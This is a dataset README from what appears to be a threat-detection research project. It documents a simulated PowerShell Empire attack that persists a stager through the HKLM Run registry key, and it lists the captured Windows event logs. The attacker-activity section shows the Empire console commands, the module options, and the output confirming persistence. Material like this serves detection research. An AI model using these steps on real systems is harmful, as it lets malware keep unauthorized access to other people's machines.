# Empire Elevated Registry

Persist a stager (or script) via the HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key.

## Technique(s) ID

T1060

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_elevated_registry.tar.gz](./empire_elevated_registry.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18183936

## About this file

| log_name                                 | source_name                         | task                                                   |   record_number |
|------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | PowerShell                          | Pipeline Execution Details                             |             205 |
| Security                                 | Microsoft-Windows-Security-Auditing | Removable Storage                                      |             106 |
| Security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |              72 |
| Security                                 | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |              63 |
| Security                                 | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              37 |
| Security                                 | Microsoft-Windows-Security-Auditing | Registry                                               |              16 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Creation                                       |               4 |
| Security                                 | Microsoft-Windows-Security-Auditing | Group Membership                                       |               3 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logoff                                                 |               3 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logon                                                  |               3 |
| Security                                 | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | File System                                            |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | Special Logon                                          |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | File Share                                             |               1 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Termination                                    |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             245 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             132 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              59 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |              40 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              25 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              16 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               5 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               4 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               1 |
| Microsoft-Windows-PowerShell/Operational | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             172 |

## Attacker Activity

```
(Empire: TKV35P8X) > usemodule persistence/elevated/registry*
(Empire: powershell/persistence/elevated/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/elevated/registry
        NeedsAdmin: True
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) via the
  HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  Listener   False                                 Listener to use.                        
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKLM:SOFTWARE\Microsoft\  Registry location to store the script   
                         Windows\CurrentVersion\D  code. Last element is the key name.     
                         ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  ExtFile    False                                 Use an external file for the payload    
                                                   instead of a stager.                    
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                   script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                   the script code.                        
  Agent      True        TKV35P8X                  Agent to run module on.                 

(Empire: powershell/persistence/elevated/registry) > set Listener https
(Empire: powershell/persistence/elevated/registry) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 1
[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/registry
(Empire: powershell/persistence/elevated/registry) > Registry persistence established using listener https stored in HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug.

(Empire: powershell/persistence/elevated/registry) > 
(Empire: powershell/persistence/elevated/registry) >
```